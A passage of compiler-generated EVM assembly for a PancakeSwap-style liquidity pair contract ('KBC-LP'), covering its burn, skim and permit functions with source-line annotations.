  dup1\n      dup4\n      add\n      swap3\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8031:8056  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_231\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_231:\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_232\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_232:\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_233\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_233:\n      pop\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8116:8120  this */\n      address\n        /* \"src/Pair.sol\":8081:8095  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":8098:8122  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8098:8107  balanceOf */\n      0x01\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"src/Pair.sol\":8098:8122  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":8146:8176  _mintFee(_reserve0, _reserve1) */\n      tag_234\n        /* \"src/Pair.sol\":8155:8164  _reserve0 */\n      dup9\n        /* \"src/Pair.sol\":8166:8175  _reserve1 */\n      dup9\n        /* \"src/Pair.sol\":8146:8154  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":8146:8176  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_234:\n        /* \"src/Pair.sol\":8186:8203  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":8206:8217  totalSupply */\n      sload\n        /* \"src/Pair.sol\":8133:8176  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":8206:8217  totalSupply */\n      dup1\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      tag_235\n        /* \"src/Pair.sol\":8315:8324  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8329:8337  balance0 */\n      dup8\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"src/Pair.sol\":8315:8328  liquidity.mul */\n      tag_168\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_235:\n        /* \"src/Pair.sol\":8315:8353  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_236\n      jumpi\n      invalid\n    tag_236:\n      div\n      swap11\n      pop\n        /* \"src/Pair.sol\":8447:8459  _totalSupply */\n      dup1\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      tag_237\n        /* \"src/Pair.sol\":8421:8430  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8435:8443  balance1 */\n      dup7\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"src/Pair.sol\":8421:8434  liquidity.mul */\n      tag_168\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_237:\n        /* \"src/Pair.sol\":8421:8459  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_238\n      jumpi\n      invalid\n    tag_238:\n      div\n        /* \"src/Pair.sol\":8411:8459  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"src/Pair.sol\":8548:8549  0 */\n      0x00\n        /* \"src/Pair.sol\":8538:8545  amount0 */\n      dup12\n        /* \"src/Pair.sol\":8538:8549  amount0 > 0 */\n      gt\n        /* \"src/Pair.sol\":8538:8564  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_239\n      jumpi\n      pop\n        /* \"src/Pair.sol\":8563:8564  0 */\n      0x00\n        /* \"src/Pair.sol\":8553:8560  amount1 */\n      dup11\n        /* \"src/Pair.sol\":8553:8564  amount1 > 0 */\n      gt\n        /* \"src/Pair.sol\":8538:8564  amount0 > 0 && amount1 > 0 */\n    tag_239:\n        /* \"src/Pair.sol\":8517:8628  require(... */\n      tag_240\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_240:\n        /* \"src/Pair.sol\":8638:8669  _burn(address(this), liquidity) */\n      tag_241\n        /* \"src/Pair.sol\":8652:8656  this */\n      address\n        /* \"src/Pair.sol\":8659:8668  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8638:8643  _burn */\n      tag_242\n        /* \"src/Pair.sol\":8638:8669  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_241:\n        /* \"src/Pair.sol\":8679:8714  _safeTransfer(_token0, to, amount0) */\n      tag_243\n        /* \"src/Pair.sol\":8693:8700  _token0 */\n      dup8\n        /* \"src/Pair.sol\":8702:8704  to */\n      dup14\n        /* \"src/Pair.sol\":8706:8713  amount0 */\n      dup14\n        /* \"src/Pair.sol\":8679:8692  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":8679:8714  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_243:\n        /* \"src/Pair.sol\":8724:8759  _safeTransfer(_token1, to, amount1) */\n      tag_244\n        /* \"src/Pair.sol\":8738:8745  _token1 */\n      dup7\n        /* \"src/Pair.sol\":8747:8749  to */\n      dup14\n        /* \"src/Pair.sol\":8751:8758  amount1 */\n      dup13\n        /* \"src/Pair.sol\":8724:8737  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":8724:8759  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_244:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8814:8818  this */\n      address\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8780:8805  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8780:8805  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_245\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_245:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_246\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_246:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_247\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_247:\n      pop\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8875:8879  this */\n      address\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8841:8866  IERC20(_token1).balanceOf */\n      dup9\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8841:8866  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_248\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_248:\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_249\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_249:\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_250\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_250:\n      pop\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"src/Pair.sol\":8892:8941  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_251\n        /* \"src/Pair.sol\":8900:8908  balance0 */\n      dup6\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"src/Pair.sol\":8920:8929  _reserve0 */\n      dup12\n        /* \"src/Pair.sol\":8931:8940  _reserve1 */\n      dup12\n        /* \"src/Pair.sol\":8892:8899  _update */\n      tag_179\n        /* \"src/Pair.sol\":8892:8941  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_251:\n        /* \"src/Pair.sol\":8955:8960  feeOn */\n      dup2\n        /* \"src/Pair.sol\":8951:8998  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_252\n      jumpi\n        /* \"src/Pair.sol\":8989:8997  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      tag_253\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":8975:8983  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":8989:8997  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/Pair.sol\":8970:8988  uint(reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_253:\n        /* \"src/Pair.sol\":8962:8967  kLast */\n      0x0e\n        /* \"src/Pair.sol\":8962:8998  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/Pair.sol\":8951:8998  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_252:\n        /* \"src/Pair.sol\":9053:9091  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"src/Pair.sol\":9058:9068  msg.sender */\n      caller\n      swap3\n        /* \"src/Pair.sol\":9053:9091  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/Pair.sol\":1244:1245  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_96:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_98:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_105:\n        /* \"src/ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_182\n        /* \"src/ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"src/ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"src/ERC20.sol\":3042:3051  _transfer */\n      tag_190\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_107:\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n    tag_110:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_257\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_257:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":17818:17824  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":17958:17966  reserve0 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":17947:17951  this */\n      address\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"src/Pair.sol\":17818:17824  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"src/Pair.sol\":17849:17977  _safeTransfer(... */\n      tag_259\n      swap3\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup6\n      swap3\n        /* \"src/Pair.sol\":17897:17899  to */\n      dup8\n      swap3\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_260\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":17958:17966  reserve0 */\n      and\n      swap2\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup6\n      swap2\n        /* \"src/Pair.sol\":17913:17938  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup7\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_261:\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_262\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_262:\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_263\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_263:\n      pop\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"src/Pair.sol\":17913:17957  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_170\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_260:\n        /* \"src/Pair.sol\":17849:17862  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":17849:17977  _safeTransfer(... */\n      jump\t// in\n    tag_259:\n        /* \"src/Pair.sol\":18096:18104  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18085:18089  this */\n      address\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":17987:18115  _safeTransfer(... */\n      tag_264\n      swap3\n        /* \"src/Pair.sol\":18014:18021  _token1 */\n      dup5\n      swap3\n        /* \"src/Pair.sol\":18035:18037  to */\n      dup8\n      swap3\n        /* \"src/Pair.sol\":18051:18105  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_260\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":18096:18104  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18051:18076  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18051:18076  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"src/Pair.sol\":17987:18115  _safeTransfer(... */\n    tag_264:\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"src/Pair.sol\":559:581  address public factory */\n    tag_112:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":614:635  address public token1 */\n    tag_114:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_117:\n        /* \"src/ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"src/ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"src/ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_270\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_270:\n        /* \"src/ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      